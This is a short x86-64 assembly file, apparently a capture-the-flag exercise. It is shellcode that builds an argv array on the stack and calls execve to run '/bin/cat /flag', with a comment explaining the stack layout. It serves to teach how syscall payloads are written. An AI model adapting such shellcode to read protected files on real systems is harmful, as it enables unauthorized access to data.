        .intel_syntax noprefix
        .global _start
        .text

_start:
        
	mov     rax, 59
        lea     rdi, [rip+arg0]
	

	mov	rcx, 0
	push rcx

	lea 	rcx, [rip+arg1]
	push 	rcx

	lea 	rcx, [rip+arg0]
	push 	rcx

	mov 	rsi, rsp


        mov     rdx, 0
        syscall
        pop rcx
	pop rcx
	pop rcx

arg0: .ascii "/bin/cat\0"
arg1: .ascii "/flag\0"
/*
	argv: .quad arg0, arg1, 0

	instead of creating that array of pointers,
	im pushing the pointers onto the stack in reverse order.

	0,
	arg0,
	arg1.

	then providing rsi with the stack pointer
*/
